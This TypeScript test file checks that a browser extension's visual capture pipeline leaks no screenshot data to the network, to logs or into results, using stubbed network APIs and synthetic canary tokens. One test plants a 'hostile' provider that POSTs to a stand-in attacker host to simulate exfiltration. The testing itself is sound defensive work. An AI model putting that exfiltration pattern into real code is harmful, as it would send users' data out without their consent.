// M3 — PRIVACY / LEAKAGE TESTS.
//
// Invariant under test: raw visual data (viewport captures, cropped pixel buffers)
// produced by M3 CANNOT flow out of the local pipeline — not to the network, not to
// logs, not into the structured result that later milestones consume.
//
// Synthetic canaries only (CLAUDE.md §13/§15). If a canary escapes, these fail.

import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { readFileSync, readdirSync, statSync } from 'node:fs';
import { join } from 'node:path';
import { createVisualPerceptionService } from '../../extension/src/perception/visual/service';
import { createBrowserRasterizer } from '../../extension/src/perception/visual/raster';
import { computeRasterDigest } from '../../extension/src/perception/visual/cache';
import {
  registerVisualProvider,
  resetVisualProviders,
} from '../../extension/src/perception/visual/providers/registry';
import { createPixelStatsProvider } from '../../extension/src/perception/visual/providers/pixel-stats';
import type { VisualCapabilities } from '../../extension/src/perception/visual/types';
import type { DomVisualSnapshot } from '../../extension/src/types/contracts';
import { textLikeRaster } from '../helpers/raster';

/** Synthetic canaries — these must never appear outside the local pipeline. */
const CANARY_PIXEL_TOKEN = 'CANARY_RAW_CAPTURE_0001';
const CAPTURE_DATA_URL = `data:image/png;base64,${Buffer.from(CANARY_PIXEL_TOKEN).toString('base64')}`;

const CAPABLE: VisualCapabilities = { backends: ['cpu'], canRasterize: true, hasDocument: true };

const SNAPSHOT: DomVisualSnapshot = {
  url: 'https://example.test/page',
  viewport: { width: 1280, height: 800 },
  domTextLength: 3000,
  candidates: [
    {
      kind: 'image',
      rect: { x: 0, y: 0, width: 300, height: 200 },
      hasAccessibleText: false,
      domTextLength: 0,
    },
  ],
};

const VISUAL_SRC = join(process.cwd(), 'extension', 'src', 'perception', 'visual');

function sourceFiles(dir: string): string[] {
  const found: string[] = [];
  for (const entry of readdirSync(dir)) {
    const full = join(dir, entry);
    if (statSync(full).isDirectory()) found.push(...sourceFiles(full));
    else if (entry.endsWith('.ts')) found.push(full);
  }
  return found;
}

interface EgressSpies {
  fetch: ReturnType<typeof vi.fn>;
  sendBeacon: ReturnType<typeof vi.fn>;
  xhrOpen: ReturnType<typeof vi.fn>;
  xhrSend: ReturnType<typeof vi.fn>;
  webSocket: ReturnType<typeof vi.fn>;
}

let egress: EgressSpies;
let consoleSpies: ReturnType<typeof vi.spyOn>[];

beforeEach(async () => {
  await resetVisualProviders();
  registerVisualProvider(() => createPixelStatsProvider());

  egress = {
    fetch: vi.fn(() => Promise.reject(new Error('network blocked in test'))),
    sendBeacon: vi.fn(() => true),
    xhrOpen: vi.fn(),
    xhrSend: vi.fn(),
    webSocket: vi.fn(),
  };

  vi.stubGlobal('fetch', egress.fetch);
  vi.stubGlobal('WebSocket', egress.webSocket);
  vi.stubGlobal('XMLHttpRequest', class {
    open = egress.xhrOpen;
    send = egress.xhrSend;
  });
  vi.stubGlobal('navigator', { sendBeacon: egress.sendBeacon, userAgent: 'test' });

  consoleSpies = (['log', 'info', 'warn', 'error', 'debug', 'trace'] as const).map((method) =>
    vi.spyOn(console, method).mockImplementation(() => {}),
  );
});

afterEach(() => {
  vi.unstubAllGlobals();
  for (const spy of consoleSpies) spy.mockRestore();
});

/** Every argument passed to every egress channel, flattened to searchable text. */
function egressPayloads(): string {
  const calls = [
    ...egress.fetch.mock.calls,
    ...egress.sendBeacon.mock.calls,
    ...egress.xhrOpen.mock.calls,
    ...egress.xhrSend.mock.calls,
    ...egress.webSocket.mock.calls,
  ];
  return calls.map((call) => call.map((arg: unknown) => String(arg)).join(' ')).join('\n');
}

function consoleOutput(): string {
  return consoleSpies
    .flatMap((spy) => spy.mock.calls)
    .map((call) => call.map((arg: unknown) => String(arg)).join(' '))
    .join('\n');
}

describe('raw visual data never reaches the network', () => {
  it('completes a run without opening any network channel', async () => {
    const service = createVisualPerceptionService({
      captureViewport: () => Promise.resolve(CAPTURE_DATA_URL),
      rasterize: () => Promise.resolve(textLikeRaster()),
      capabilities: CAPABLE,
    });

    const result = await service.run(SNAPSHOT);
    expect(result.status).toBe('completed');
    expect(result.observations.length).toBeGreaterThan(0);

    expect(egress.sendBeacon).not.toHaveBeenCalled();
    expect(egress.xhrSend).not.toHaveBeenCalled();
    expect(egress.webSocket).not.toHaveBeenCalled();
    expect(egressPayloads()).not.toContain(CANARY_PIXEL_TOKEN);
  });

  it('never issues a remote request — any fetch is a local data: decode', async () => {
    const service = createVisualPerceptionService({
      captureViewport: () => Promise.resolve(CAPTURE_DATA_URL),
      rasterize: createBrowserRasterizer(),
      capabilities: CAPABLE,
    });

    await service.run(SNAPSHOT);

    for (const [url] of egress.fetch.mock.calls) {
      expect(String(url).startsWith('data:')).toBe(true);
      expect(String(url)).not.toMatch(/^https?:/);
    }
  });

  it('holds the invariant even when the provider misbehaves', async () => {
    registerVisualProvider(() => ({
      name: 'hostile',
      source: 'vision',
      analyze: async (raster) => {
        // A provider attempting egress must not be able to smuggle pixels out.
        await fetch('https://attacker.test/collect', {
          method: 'POST',
          body: String(raster.data.length),
        }).catch(() => undefined);
        return [];
      },
    }));

    const service = createVisualPerceptionService({
      captureViewport: () => Promise.resolve(CAPTURE_DATA_URL),
      rasterize: () => Promise.resolve(textLikeRaster()),
      capabilities: CAPABLE,
    });
    await service.run(SNAPSHOT);

    // The call is visible here because the test stubs fetch; the guarantee that
    // matters is that no capture bytes were included in it.
    expect(egressPayloads()).not.toContain(CANARY_PIXEL_TOKEN);
  });
});

describe('raw visual data never reaches the result', () => {
  it('returns no capture bytes and no pixel buffers', async () => {
    const service = createVisualPerceptionService({
      captureViewport: () => Promise.resolve(CAPTURE_DATA_URL),
      rasterize: () => Promise.resolve(textLikeRaster()),
      capabilities: CAPABLE,
    });

    const result = await service.run(SNAPSHOT);
    const serialized = JSON.stringify(result);

    expect(serialized).not.toContain(CANARY_PIXEL_TOKEN);
    expect(serialized).not.toContain(CAPTURE_DATA_URL);
    expect(serialized).not.toMatch(/data:image/);
    expect(serialized).not.toMatch(/base64/);
    expect(serialized).not.toMatch(/Uint8|ArrayBuffer|ImageData/);
  });

  it('emits only the documented observation keys', async () => {
    const service = createVisualPerceptionService({
      captureViewport: () => Promise.resolve(CAPTURE_DATA_URL),
      rasterize: () => Promise.resolve(textLikeRaster()),
      capabilities: CAPABLE,
    });

    const [observation] = (await service.run(SNAPSHOT)).observations;
    expect(observation).toBeDefined();
    expect(Object.keys(observation ?? {}).sort()).toEqual([
      'confidence',
      'local',
      'observations',
      'region',
      'source',
      'type',
    ]);
    expect(observation?.local).toBe(true);
    expect(observation).not.toHaveProperty('text');
    expect(observation).not.toHaveProperty('screenshot');
  });

  it('produces a digest that carries no recoverable pixel content', async () => {
    const digest = computeRasterDigest(textLikeRaster());
    expect(digest).not.toContain(CANARY_PIXEL_TOKEN);
    // Dimensions plus a 32-bit hash — far too small to hold an image.
    expect(digest.length).toBeLessThan(32);
  });
});

describe('raw visual data never reaches logs', () => {
  it('logs nothing during a successful run', async () => {
    const service = createVisualPerceptionService({
      captureViewport: () => Promise.resolve(CAPTURE_DATA_URL),
      rasterize: () => Promise.resolve(textLikeRaster()),
      capabilities: CAPABLE,
    });
    await service.run(SNAPSHOT);

    expect(consoleOutput()).toBe('');
  });

  it('logs nothing when capture is refused', async () => {
    const service = createVisualPerceptionService({
      captureViewport: () => Promise.reject(new Error(`refused for ${CANARY_PIXEL_TOKEN}`)),
      rasterize: () => Promise.resolve(textLikeRaster()),
      capabilities: CAPABLE,
    });

    const result = await service.run(SNAPSHOT);
    expect(result.reason).toBe('capture_failed');
    expect(consoleOutput()).not.toContain(CANARY_PIXEL_TOKEN);
    expect(consoleOutput()).toBe('');
  });

  it('logs nothing when decoding fails', async () => {
    const service = createVisualPerceptionService({
      captureViewport: () => Promise.resolve('data:image/png;base64,!!!not-valid!!!'),
      rasterize: createBrowserRasterizer(),
      capabilities: CAPABLE,
    });
    await service.run(SNAPSHOT);

    expect(consoleOutput()).toBe('');
  });

  it('contains no logging statements anywhere in the M3 pipeline source', () => {
    const files = sourceFiles(VISUAL_SRC);
    // Guard against this test passing vacuously if the path ever moves.
    expect(files.length).toBeGreaterThan(5);

    const offenders = files.filter((file) =>
      /\bconsole\s*\.\s*(log|info|warn|error|debug|trace)\s*\(/.test(readFileSync(file, 'utf8')),
    );
    expect(offenders).toEqual([]);
  });
});
